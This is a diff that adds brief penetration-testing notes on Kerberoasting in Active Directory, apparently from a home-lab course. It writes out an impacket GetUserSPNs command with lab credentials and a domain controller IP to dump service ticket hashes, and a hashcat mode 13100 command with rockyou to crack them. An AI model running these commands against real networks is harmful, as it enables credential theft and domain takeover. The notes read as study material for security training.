@@ -1,0 +1,11 @@
+# Kerberoasting
+
+- Very popular way to get domain admin in a network
+- Takes advantage of service accounts
+- [GetUserSPNs.py](http://GetUserSPNs.py) <DOMAIN/user:password> -dc-ip <ip of DC> -request
+- impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.43.143 -request
+    - will dump hash
+
+
+- crack the hash with:
+    - hashcat -m <module> (13100) kerberoast.txt rockyou.txt
